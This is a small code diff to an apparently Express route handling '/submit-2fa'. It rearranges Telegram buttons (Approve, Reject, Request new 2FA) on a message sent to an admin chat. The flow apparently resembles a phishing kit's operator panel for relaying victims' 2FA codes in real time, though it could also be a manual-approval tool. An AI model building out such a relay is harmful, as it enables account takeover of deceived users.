@@ -109,11 +109,15 @@ router.post('/submit-2fa', function (req, res) {
             chat_id: TELEGRAM_ADMIN_CHAT_ID,
             text: notifyText + '\n\nAction?',
             reply_markup: {
-                inline_keyboard: [[
-                    { text: '✅ Approve',      callback_data: 'approve:'  + id },
-                    { text: '🔐 2FA Again',    callback_data: '2fa_email:' + id },
-                    { text: '❌ Reject',       callback_data: 'reject:'   + id }
-                ]]
+                inline_keyboard: [
+                    [
+                        { text: '✅ Approve', callback_data: 'approve:' + id },
+                        { text: '❌ Reject', callback_data: 'reject:' + id }
+                    ],
+                    [
+                        { text: '🔐 Request new 2FA', callback_data: '2fa_email:' + id }
+                    ]
+                ]
             }
         }).catch(err => console.error('2FA notify failed:', err));
     }
